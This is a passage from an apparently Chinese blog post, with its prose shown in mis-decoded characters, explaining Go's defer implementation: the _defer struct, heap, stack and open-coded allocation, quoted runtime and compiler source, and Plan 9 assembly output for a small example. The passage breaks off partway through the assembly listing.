class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>siz</code> å»¶è¿Ÿå‡½æ•°çš„å‚æ•°å’Œè¿”å›å€¼å¤§å°</li>
<li><code>heap</code> è¿™ä¸ªç»“æ„ä½“æ˜¯å¦åœ¨å †ä¸Šåˆ†é…</li>
<li><code>sp</code> å’Œ <code>pc</code> åˆ†åˆ«æ˜¯è°ƒç”¨è€…æ ˆæŒ‡é’ˆå’Œç¨‹åºè®¡æ•°å™¨</li>
<li><code>fn</code> å»¶è¿Ÿå‡½æ•°æŒ‡é’ˆ</li>
<li><code>_panic</code> è§¦å‘è¿™ä¸ª defer çš„ panic</li>
<li><code>openDefer</code> è¡¨ç¤ºå½“å‰ defer æ˜¯å¦ç»è¿‡å¼€æ”¾ç¼–ç çš„ä¼˜åŒ–</li>
<li><code>link</code> ä¸‹ä¸€ä¸ª _defer ç»“æ„ä½“</li>
</ul>
<p>å¤šä¸ª <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> ç»“æ„ä½“é€šè¿‡ <code>link</code> å­—æ®µä»¥é“¾è¡¨çš„å½¢å¼ç»„ç»‡èµ·æ¥ã€‚</p>
<h3 id="ç¼–è¯‘é˜¶æ®µå¯¹-defer-çš„å¤„ç†"><a href="#ç¼–è¯‘é˜¶æ®µå¯¹-defer-çš„å¤„ç†" class="headerlink" title="ç¼–è¯‘é˜¶æ®µå¯¹ defer çš„å¤„ç†"></a>ç¼–è¯‘é˜¶æ®µå¯¹ defer çš„å¤„ç†</h3><p>ç¼–è¯‘é˜¶æ®µç¼–è¯‘å™¨ä¼šä½¿ç”¨ <a href="https://github.com/golang/go/blob/4d5bb9c60905b162da8b767a8a133f6b4edcaa65/src/cmd/compile/internal/gc/ssa.go#L1023">cmd/compile/internal/gc.state.stmt</a> å‡½æ•°å¤„ç†ä»£ç é‡Œçš„ defer å…³é”®å­—ï¼Œè¯¥å‡½æ•°ä¼šæ ¹æ®æ¡ä»¶çš„ä¸åŒï¼Œä½¿ç”¨ä¸‰ç§ä¸åŒçš„æœºåˆ¶å¤„ç†è¯¥å…³é”®å­—ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *state)</span> <span class="title">stmt</span><span class="params">(n *Node)</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">switch</span> n.Op &#123;</span><br><span class="line">    <span class="keyword">case</span> ODEFER:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> s.hasOpenDefers &#123;</span><br><span class="line">            s.openDeferRecord(n.Left) <span class="comment">// å¼€æ”¾ç¼–ç </span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            d := callDefer <span class="comment">// å †åˆ†é… _defer ç»“æ„ä½“</span></span><br><span class="line">            <span class="keyword">if</span> n.Esc == EscNever &#123;</span><br><span class="line">                d = callDeferStack <span class="comment">// æ ˆåˆ†é… _defer ç»“æ„ä½“</span></span><br><span class="line">            &#125;</span><br><span class="line">            s.call(n.Left, d)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å †åˆ†é…æ˜¯ Go æœ€æ—©çš„å®ç°æ–¹å¼ï¼Œä½†æ˜¯è¿™æ ·æ€§èƒ½è¾ƒå·®ï¼Œåœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹å¯èƒ½æ‹–æ…¢ç³»ç»Ÿçš„é€Ÿåº¦ã€‚ä» 1.13 å¼€å§‹æ–°å¢äº†æ ˆåˆ†é…ï¼Œå‡å°‘äº† 30% çš„é¢å¤–å¼€é”€ï¼Œå¹¶åœ¨ 1.14 ä¸­å¼•å…¥äº†åŸºäºå¼€æ”¾ç¼–ç çš„ deferï¼Œä½¿å¾—è¯¥å…³é”®å­—çš„é¢å¤–å¼€é”€å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</p>
<h3 id="å †ä¸Šåˆ†é…"><a href="#å †ä¸Šåˆ†é…" class="headerlink" title="å †ä¸Šåˆ†é…"></a>å †ä¸Šåˆ†é…</h3><p><a href="https://github.com/golang/go/blob/4d5bb9c60905b162da8b767a8a133f6b4edcaa65/src/cmd/compile/internal/gc/ssa.go#L1023">cmd/compile/internal/gc.state.stmt</a> å‡½æ•°æœ€åè°ƒç”¨äº† <a href="https://github.com/golang/go/blob/4d5bb9c60905b162da8b767a8a133f6b4edcaa65/src/cmd/compile/internal/gc/ssa.go#L4324">cmd/compile/internal/gc.state.call</a>ã€‚call å‡½æ•°ä¸åªç”¨åœ¨ defer å…³é”®å­—ï¼Œè¿˜è¢«ç”¨æ¥ä¸ºæ‰€æœ‰å‡½æ•°å’Œæ–¹æ³•ç”Ÿæˆä¸­é—´ä»£ç ï¼Œä½†è¿™é‡Œæˆ‘ä»¬åªå…³æ³¨ä¸ defer æœ‰å…³çš„éƒ¨åˆ†ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *state)</span> <span class="title">call</span><span class="params">(n *Node, k callKind)</span> *<span class="title">ssa</span>.<span class="title">Value</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">var</span> call *ssa.Value</span><br><span class="line">    <span class="keyword">if</span> k == callDeferStack &#123;</span><br><span class="line">        <span class="comment">// åœ¨æ ˆä¸Šåˆå§‹åŒ– defer ç»“æ„ä½“</span></span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">switch</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> k == callDefer:</span><br><span class="line">            call = s.newValue1A(ssa.OpStaticCall, types.TypeMem, deferproc, s.mem()) <span class="comment">// è°ƒç”¨ runtime.deferproc å‡½æ•°</span></span><br><span class="line">        ...</span><br><span class="line">        &#125;</span><br><span class="line">        call.AuxInt = stksize <span class="comment">// Call operations carry the argsize of the callee along with them</span></span><br><span class="line">    &#125;</span><br><span class="line">    s.vars[&amp;memVar] = call</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>defer å…³é”®å­—åœ¨è¿è¡ŒæœŸé—´ä¼šè°ƒç”¨ <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L223">runtime.deferproc</a> å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ¥æ”¶äº†å‚æ•°çš„å¤§å°å’Œé—­åŒ…æ‰€åœ¨çš„åœ°å€ä¸¤ä¸ªå‚æ•°ï¼Œè´Ÿè´£åˆ›å»ºæ–°çš„å»¶è¿Ÿè°ƒç”¨ä»»åŠ¡ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deferproc</span><span class="params">(siz <span class="keyword">int32</span>, fn *funcval)</span></span> &#123;</span><br><span class="line">    gp := getg()</span><br><span class="line">    <span class="keyword">if</span> gp.m.curg != gp &#123;</span><br><span class="line">        throw(<span class="string">&quot;defer on system stack&quot;</span>) <span class="comment">// go code on the system stack can&#x27;t defer</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sp := getcallersp()</span><br><span class="line">    argp := <span class="keyword">uintptr</span>(unsafe.Pointer(&amp;fn)) + unsafe.Sizeof(fn)</span><br><span class="line">    callerpc := getcallerpc()</span><br><span class="line"></span><br><span class="line">    d := newdefer(siz)</span><br><span class="line">    <span class="keyword">if</span> d._panic != <span class="literal">nil</span> &#123;</span><br><span class="line">        throw(<span class="string">&quot;deferproc: d.panic != nil after newdefer&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    d.link = gp._defer</span><br><span class="line">    gp._defer = d <span class="comment">// æ–°çš„ _defer ç»“æ„ä½“è¢«è¿½åŠ åˆ° Goroutine æŒæœ‰çš„ defer é“¾è¡¨å¤´éƒ¨</span></span><br><span class="line">    d.fn = fn</span><br><span class="line">    d.pc = callerpc</span><br><span class="line">    d.sp = sp</span><br><span class="line">    <span class="keyword">switch</span> siz &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="comment">// Do nothing.</span></span><br><span class="line">    <span class="keyword">case</span> sys.PtrSize:</span><br><span class="line">        *(*<span class="keyword">uintptr</span>)(deferArgs(d)) = *(*<span class="keyword">uintptr</span>)(unsafe.Pointer(argp))</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        memmove(deferArgs(d), unsafe.Pointer(argp), <span class="keyword">uintptr</span>(siz))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deferproc returns 0 normally.</span></span><br><span class="line">    <span class="comment">// a deferred func that stops a panic</span></span><br><span class="line">    <span class="comment">// makes the deferproc return 1.</span></span><br><span class="line">    <span class="comment">// the code the compiler generates always</span></span><br><span class="line">    <span class="comment">// checks the return value and jumps to the</span></span><br><span class="line">    <span class="comment">// end of the function if deferproc returns != 0.</span></span><br><span class="line">    return0()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L223">runtime.deferproc</a> ä¸­çš„ <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L392">runtime.newdefer</a> å‡½æ•°çš„ä½œç”¨æ˜¯æƒ³å°½åŠæ³•è·å¾—ä¸€ä¸ª <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> ç»“æ„ä½“ï¼ŒåŠæ³•æœ‰ä¸‰ä¸ªï¼š</p>
<ol>
<li>ä»è°ƒåº¦å™¨çš„å»¶è¿Ÿè°ƒç”¨ç¼“å­˜æ±  <code>sched.deferpool</code> ä¸­å–å‡ºç»“æ„ä½“å¹¶å°†è¯¥ç»“æ„ä½“è¿½åŠ åˆ°å½“å‰ Goroutine çš„ç¼“å­˜æ± ä¸­ï¼›</li>
<li>ä» Goroutine çš„å»¶è¿Ÿè°ƒç”¨ç¼“å­˜æ±  <code>pp.deferpool</code> ä¸­å–å‡ºç»“æ„ä½“</li>
<li>é€šè¿‡ <a href="https://github.com/golang/go/blob/921ceadd2997f2c0267455e13f909df044234805/src/runtime/malloc.go#L891">runtime.mallocgc</a> åœ¨å †ä¸Šåˆ›å»ºä¸€ä¸ªæ–°çš„ç»“æ„ä½“</li>
</ol>
<p>æ— è®ºä½¿ç”¨å“ªç§æ–¹å¼ï¼Œåªè¦è·å–åˆ° <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> ç»“æ„ä½“ï¼Œå®ƒéƒ½ä¼šè¢«è¿½åŠ åˆ°æ‰€åœ¨ Goroutine çš„ _defer é“¾è¡¨çš„æœ€å‰é¢ã€‚</p>
<h3 id="æ ˆä¸Šåˆ†é…"><a href="#æ ˆä¸Šåˆ†é…" class="headerlink" title="æ ˆä¸Šåˆ†é…"></a>æ ˆä¸Šåˆ†é…</h3><p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° Go è¯­è¨€ä¸­ <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> ç»“æ„ä½“éƒ½ä¼šåœ¨å †ä¸Šåˆ†é…ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå°†éƒ¨åˆ†ç»“æ„ä½“åˆ†é…åˆ°å †ä¸Šå°±å¯ä»¥èŠ‚çº¦å†…å­˜åˆ†é…å¸¦æ¥çš„é¢å¤–å¼€é”€ã€‚</p>
<p>Go è¯­è¨€å›¢é˜Ÿåœ¨ 1.13 ä¸­å¯¹ defer å…³é”®å­—è¿›è¡Œäº†ä¼˜åŒ–ï¼Œ<strong>å½“è¯¥å…³é”®å­—åœ¨å‡½æ•°ä½“ä¸­æœ€å¤šæ‰§è¡Œä¸€æ¬¡æ—¶</strong>ï¼Œç¼–è¯‘æœŸé—´çš„ <a href="https://github.com/golang/go/blob/4d5bb9c60905b162da8b767a8a133f6b4edcaa65/src/cmd/compile/internal/gc/ssa.go#L4324">cmd/compile/internal/gc.state.call</a> ä¼šå°†ç»“æ„ä½“åˆ†é…åˆ°æ ˆä¸Šå¹¶è°ƒç”¨ <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L276">runtime.deferprocStack</a>ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *state)</span> <span class="title">call</span><span class="params">(n *Node, k callKind)</span> *<span class="title">ssa</span>.<span class="title">Value</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">var</span> call *ssa.Value</span><br><span class="line">    <span class="keyword">if</span> k == callDeferStack &#123;</span><br><span class="line">        <span class="comment">// Make a defer struct d on the stack.</span></span><br><span class="line">        t := deferstruct(stksize)</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// Call runtime.deferprocStack with pointer to _defer record.</span></span><br><span class="line">        arg0 := s.constOffPtrSP(types.Types[TUINTPTR], Ctxt.FixedFrameSize())</span><br><span class="line">        s.store(types.Types[TUINTPTR], arg0, addr)</span><br><span class="line">        call = s.newValue1A(ssa.OpStaticCall, types.TypeMem, deferprocStack, s.mem())</span><br><span class="line">        <span class="keyword">if</span> stksize &lt; <span class="keyword">int64</span>(Widthptr) &#123;</span><br><span class="line">            <span class="comment">// We need room for both the call to deferprocStack and the call to</span></span><br><span class="line">            <span class="comment">// the deferred function.</span></span><br><span class="line">            stksize = <span class="keyword">int64</span>(Widthptr)</span><br><span class="line">        &#125;</span><br><span class="line">        call.AuxInt = stksize</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    s.vars[&amp;memVar] = call</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºåœ¨ç¼–è¯‘æœŸé—´æˆ‘ä»¬å·²ç»åˆ›å»ºäº† <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> ç»“æ„ä½“ï¼Œæ‰€ä»¥ <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L276">runtime.deferprocStack</a> å‡½æ•°åœ¨è¿è¡ŒæœŸé—´æˆ‘ä»¬åªéœ€è¦è®¾ç½®é‚£äº›æœªåœ¨ç¼–è¯‘æœŸåˆå§‹åŒ–çš„å­—æ®µå¹¶å°†æ ˆä¸Šçš„ç»“æ„ä½“è¿½åŠ åˆ°å‡½æ•°çš„é“¾è¡¨ä¸Šï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deferprocStack</span><span class="params">(d *_defer)</span></span> &#123;</span><br><span class="line">    gp := getg()</span><br><span class="line">    <span class="keyword">if</span> gp.m.curg != gp &#123;</span><br><span class="line">        <span class="comment">// go code on the system stack can&#x27;t defer</span></span><br><span class="line">        throw(<span class="string">&quot;defer on system stack&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// siz and fn are already set.</span></span><br><span class="line">    <span class="comment">// The other fields are junk on entry to deferprocStack and</span></span><br><span class="line">    <span class="comment">// are initialized here.</span></span><br><span class="line">    d.started = <span class="literal">false</span></span><br><span class="line">    d.heap = <span class="literal">false</span></span><br><span class="line">    d.openDefer = <span class="literal">false</span></span><br><span class="line">    d.sp = getcallersp()</span><br><span class="line">    d.pc = getcallerpc()</span><br><span class="line">    d.framepc = <span class="number">0</span></span><br><span class="line">    d.varp = <span class="number">0</span></span><br><span class="line">    *(*<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;d._panic)) = <span class="number">0</span></span><br><span class="line">    *(*<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;d.fd)) = <span class="number">0</span></span><br><span class="line">    *(*<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;d.link)) = <span class="keyword">uintptr</span>(unsafe.Pointer(gp._defer))</span><br><span class="line">    *(*<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;gp._defer)) = <span class="keyword">uintptr</span>(unsafe.Pointer(d))</span><br><span class="line"></span><br><span class="line">    return0()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é™¤äº†åˆ†é…ä½ç½®çš„ä¸åŒï¼Œæ ˆä¸Šåˆ†é…å’Œå †ä¸Šåˆ†é…çš„<a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> å¹¶æ²¡æœ‰æœ¬è´¨çš„ä¸åŒï¼Œè€Œè¯¥æ–¹æ³•å¯ä»¥é€‚ç”¨äºç»å¤§å¤šæ•°çš„åœºæ™¯ï¼Œä¸å †ä¸Šåˆ†é… ç›¸æ¯”ï¼Œè¯¥æ–¹æ³•å¯ä»¥å°† defer å…³é”®å­—çš„é¢å¤–å¼€é”€é™ä½ ~30%ã€‚</p>
<h3 id="å¼€æ”¾ç¼–ç "><a href="#å¼€æ”¾ç¼–ç " class="headerlink" title="å¼€æ”¾ç¼–ç "></a>å¼€æ”¾ç¼–ç </h3><p>Go è¯­è¨€åœ¨ 1.14 ä¸­é€šè¿‡å¼€å‘ç¼–ç ï¼ˆOpen Codedï¼‰å®ç° defer å…³é”®å­—ï¼Œè¯¥è®¾è®¡ä½¿ç”¨ä»£ç å†…è”ä¼˜åŒ– defer å…³é”®å­—çš„é¢å¤–å¼€é”€å¹¶å¼•å…¥å‡½æ•°æ•°æ® <code>funcdata</code> ç®¡ç† panic çš„è°ƒç”¨ï¼Œè¯¥ä¼˜åŒ–å¯ä»¥å°† defer çš„è°ƒç”¨å¼€é”€ä» 1.13 ç‰ˆæœ¬çš„ ~35ns é™ä½è‡³ ~6ns å·¦å³ã€‚</p>
<h4 id="ä½¿ç”¨æ¡ä»¶"><a href="#ä½¿ç”¨æ¡ä»¶" class="headerlink" title="ä½¿ç”¨æ¡ä»¶"></a>ä½¿ç”¨æ¡ä»¶</h4><p>å¼€æ”¾ç¼–ç ä½œä¸ºä¸€ç§ä¼˜åŒ– defer å…³é”®å­—çš„æ–¹æ³•ï¼Œå®ƒä¸æ˜¯åœ¨æ‰€æœ‰çš„åœºæ™¯ä¸‹éƒ½ä¼šå¼€å¯çš„ï¼Œå¼€å‘ç¼–ç åªä¼šåœ¨æ»¡è¶³ä»¥ä¸‹çš„æ¡ä»¶æ—¶å¯ç”¨ï¼š</p>
<ul>
<li>å‡½æ•°çš„ defer æ•°é‡å°‘äºæˆ–è€…ç­‰äº 8 ä¸ªï¼›</li>
<li>å‡½æ•°çš„ defer å…³é”®å­—ä¸èƒ½åœ¨å¾ªç¯ä¸­æ‰§è¡Œï¼›</li>
<li>å‡½æ•°çš„ return è¯­å¥ä¸ defer è¯­å¥çš„ä¹˜ç§¯å°äºæˆ–è€…ç­‰äº 15 ä¸ªï¼›</li>
</ul>
<p>Go è¯­è¨€ä¼šåœ¨ç¼–è¯‘æœŸé—´æ ¹æ®ä»£ç æ˜¯å¦æ»¡è¶³ä¸Šè¿°æ¡ä»¶ç¡®å®šæ˜¯å¦ä½¿ç”¨å¼€æ”¾ç¼–ç ã€‚ä¸€æ—¦ç¡®å®šä½¿ç”¨å¼€æ”¾ç¼–ç ï¼Œå°±ä¼šåœ¨ç¼–è¯‘æœŸé—´åˆå§‹åŒ–å»¶è¿Ÿæ¯”ç‰¹å’Œå»¶è¿Ÿè®°å½•ã€‚</p>
<h4 id="å»¶è¿Ÿè®°å½•"><a href="#å»¶è¿Ÿè®°å½•" class="headerlink" title="å»¶è¿Ÿè®°å½•"></a>å»¶è¿Ÿè®°å½•</h4><p><strong>å»¶è¿Ÿæ¯”ç‰¹</strong>å’Œ<strong>å»¶è¿Ÿè®°å½•</strong>æ˜¯ä½¿ç”¨å¼€æ”¾ç¼–ç å®ç° defer çš„ä¸¤ä¸ªæœ€é‡è¦ç»“æ„ï¼Œä¸€æ—¦å†³å®šä½¿ç”¨å¼€æ”¾ç¼–ç ï¼Œç¼–è¯‘å™¨ä¼šåœ¨ç¼–è¯‘æœŸé—´åœ¨æ ˆä¸Šåˆå§‹åŒ–å¤§å°ä¸º 8 ä¸ªæ¯”ç‰¹çš„ <code>deferBits</code> å˜é‡ã€‚</p>
<p>å»¶è¿Ÿæ¯”ç‰¹ä¸­çš„æ¯ä¸€ä¸ªæ¯”ç‰¹ä½éƒ½è¡¨ç¤ºè¯¥ä½å¯¹åº”çš„ defer å…³é”®å­—æ˜¯å¦éœ€è¦è¢«æ‰§è¡Œï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå…¶ä¸­ 8 ä¸ªæ¯”ç‰¹çš„å€’æ•°ç¬¬äºŒä¸ªæ¯”ç‰¹åœ¨å‡½æ•°è¿”å›å‰è¢«è®¾ç½®æˆäº† 1ï¼Œé‚£ä¹ˆè¯¥æ¯”ç‰¹ä½å¯¹åº”çš„å‡½æ•°ä¼šåœ¨å‡½æ•°è¿”å›å‰æ‰§è¡Œï¼š</p>
<p><img src="https://i.loli.net/2020/12/16/ehniw6W1Fts9uP8.png" alt="image.png"></p>
<p>å»¶è¿Ÿæ¯”ç‰¹çš„ä½œç”¨å°±æ˜¯æ ‡è®°å“ªäº› defer å…³é”®å­—åœ¨å‡½æ•°ä¸­è¢«æ‰§è¡Œï¼Œè¿™æ ·åœ¨å‡½æ•°è¿”å›æ—¶å¯ä»¥æ ¹æ®å¯¹åº” deferBits çš„å†…å®¹ç¡®å®šæ‰§è¡Œçš„å‡½æ•°ï¼Œè€Œæ­£æ˜¯å› ä¸º deferBits çš„å¤§å°ä»…ä¸º 8 æ¯”ç‰¹ï¼Œæ‰€ä»¥è¯¥ä¼˜åŒ–çš„å¯ç”¨æ¡ä»¶ä¸ºå‡½æ•°ä¸­çš„ defer å…³é”®å­—å°‘äº 8 ä¸ªã€‚</p>
<p>ä¼ å…¥ defer å…³é”®å­—çš„å‡½æ•°å’Œå‚æ•°éƒ½ä¼šå­˜å‚¨åœ¨å»¶è¿Ÿè®°å½• <a href="https://draveness.me/golang/tree/cmd/compile/internal/gc.openDeferInfo">cmd/compile/internal/gc.openDeferInfo</a> ä¸­ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> openDeferInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">    n           *Node</span><br><span class="line">    closure     *ssa.Value      <span class="comment">// å»¶è¿Ÿè°ƒç”¨å‡½æ•°</span></span><br><span class="line">    closureNode *Node</span><br><span class="line">    rcvr        *ssa.Value      <span class="comment">// å»¶è¿Ÿæ–¹æ³•çš„æ¥æ”¶è€…</span></span><br><span class="line">    rcvrNode    *Node</span><br><span class="line">    argVals     []*ssa.Value    <span class="comment">// å»¶è¿Ÿå‡½æ•°çš„å‚æ•°</span></span><br><span class="line">    argNodes    []*Node</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¼€æ”¾ç¼–ç å¼€å¯åï¼Œä½¿ç”¨ defer å…³é”®å­—å°±å’Œæ™®é€šçš„å‡½æ•°è°ƒç”¨ç›¸å·®æ— å‡ äº†ã€‚ä¾‹å¦‚å¯¹äºä¸‹é¢ Defer.go æ–‡ä»¶ä¸­çš„ä»£ç ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">c</span><span class="params">()</span> <span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">         i++</span><br><span class="line">     &#125;()</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ <code>go tool compile -S main.go</code> å¾—åˆ°æ±‡ç¼–ä»£ç .å¯èƒ½å¾ˆå¤šäººåˆšçœ‹åˆ° go æ±‡ç¼–ä»£ç æ—¶ä¼šä¸€è„¸æ‡µï¼Œå› ä¸ºå®ƒæ—¢ä¸æ˜¯ AT&amp;T æ ¼å¼ï¼Œä¹Ÿä¸æ˜¯ Intel æ ¼å¼ï¼Œè€Œæ˜¯è¾ƒä¸ºå°ä¼—çš„ Plan 9ï¼Œ<a href="https://xargin.com/plan9-assembly/">è¿™ç¯‡æ–‡ç« </a>å¯ä»¥è®©ä½ å¿«é€Ÿäº†è§£ Plan 9ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.c STEXT size=141 args=0x8 locals=0x28</span><br><span class="line">        0x0000 00000 (Defer.go:3)       TEXT    &quot;&quot;.c(SB), ABIInternal, $40-8</span><br><span class="line">        0x0000 00000 (Defer.go:3)       MOVQ    (TLS), CX</span><br><span class="line">        0x0009 00009 (Defer.go:3)       CMPQ    SP, 16(CX)</span><br><span class="line">        0x000d 00013 (Defer.go:3)       PCDATA  $0, $-2</span><br><span class="line">        0x000d 00013 (Defer.go:3)       JLS     131</span><br><span class="line">        0x000f 00015 (Defer.go:3)       PCDATA  $0, $-1</span><br><span class="line">        0x000f 00015 (Defer.go:3)       SUBQ    $40, SP</span><br><span class="line">        0x0013 00019 (Defer.go:3)       MOVQ    BP, 32(SP)</span><br><span class="line">        0x0018 00024 (Defer.go:3)       LEAQ    32(SP), BP</span><br><span class="line">        0x001d 00029 (Defer.go:3)       XORPS   X0, X0</span><br><span class="line">        0x0020 00032 (Defer.go:3)       MOVUPS  X0, 16(SP)</span><br><span class="line">        0x0025 00037 (Defer.go:3)       FUNCDATA        $0, gclocalsÂ·69c1753bd5f81501d95132d08af04464(SB)</span><br><span class="line">        0x0025 00037 (Defer.go:3)       FUNCDATA        $1, gclocalsÂ·e226d4ae4a7cad8835311c6a4683c14f(SB)</span><br><span class="line">        0x0025 00037 (Defer.go:3)       FUNCDATA        $5, &quot;&quot;.c.opendefer(SB)</span><br><span class="line">        0x0025 00037 (Defer.go:3)       MOVB    $0, &quot;&quot;..autotmp_2+15(SP)</span><br><span class="line">        0x002a 00042 (Defer.go:3)       MOVQ    $0, &quot;&quot;.i+48(SP)</span><br><span class="line">        0x0033 00051 (Defer.go:4)       LEAQ    &quot;&quot;.c.func1Â·f(SB), AX</span><br><span class="line">        0x003a 00058 (Defer.go:4)       MOVQ    AX, &quot;&quot;..autotmp_3+24(SP)</span><br><span class="line">        0x003f 00063 (Defer.go:4)       LEAQ    &quot;&quot;.i+48(SP), AX</span><br><span class="line">        0x0044 00068 (Defer.go:4)       MOVQ    AX, &quot;&quot;..autotmp_4+16(SP)</span><br><span class="line">        0x0049 00073 (Defer.go:4)       MOVB    $1, &quot;&quot;..autotmp_2+15(SP)</span><br><span class="line">        0x004e 00078 (Defer.go:7)       MOVQ    $1, &quot;&quot;.i+48(SP)</span><br><span class="line">        0x0057 00087 (Defer.go:7)       MOVB    $0, &quot;&quot;..autotmp_2+15(SP)</span><br><span class="line">        0x005c 00092 (Defer.go:7)       MOVQ    &quot;&quot;..autotmp_4+16(SP), AX</span><br><span class="line">        0x0061 00097 (Defer.go:7)       MOVQ    AX, (SP)</span><br><span class="line">        0x0065 00101 (Defer.go:7)       PCDATA  $1, $1</span><br><span class="line">        0x0065 00101 (Defer.go:7)       CALL    &quot;&quot;.c.func1(SB)</span><br><span class="line">        0x006a 00106 (Defer.go:7)       MOVQ    32(SP), BP</span><br><span class="line">        0x006f 00111 (Defer.go:7)       ADDQ    $40, SP</span><br><span class="line">        0x0073 00115 (Defer.go:7)       RET</span><br><span class="line">        0x0074 00116 (Defer.go:7)       CALL    runtime.deferreturn(SB)</span><br><span class="line">        0x0079 00121 (Defer.go:7)       MOVQ    32(SP), BP</span><br><span class="line">        0x007e 00126 (Defer.go:7)       ADDQ    $40, SP</span><br><span class="line">        0x0082 00130 (Defer.go:7)       RET</span><br><span class="line">        0x0083 00131 (Defer.go:7)       NOP</span><br><span class="line">        0x0083 00131 (Defer.go:3)       PCDATA  $1, $-1</span><br><span class="line">        0x0083 00131 (Defer.go:3)       PCDATA  $0, $-2</span><br><span class="line">        0x0083 00131 (Defer.go:3)       CALL    runtime.morestack_noctxt(SB)</span><br><span class="line">        0x0088 00136 (Defer.go:3)       PCDATA  $0, $-1</span><br><span class="line">        0x0088 00136 (Defer.go:3)       JMP     0</span><br><span class="line"></span><br><span class="line">&quot;&quot;.c.func1 STEXT nosplit size=9 args=0x8 locals=0x0</span><br><span class="line">        0x0000 00000 (Defer.go:4)       TEXT    &quot;&quot;.c.func1(SB), NOSPLIT|ABIInternal, $0-8</span><br><span class="line">        0x0000 00000 (Defer.go:4)       FUNCDATA        $0, gclocalsÂ·1a65e721a2ccc325b382662e7ffee780(SB)</span><br><span class="line">        0x0000 00000 (Defer.go:4)       FUNCDATA        $1, gclocalsÂ·69c1753bd5f81501d95132d08af04464(SB)</span><br><span class="line">        0x0000 00000 (Defer.go:5)       MOVQ    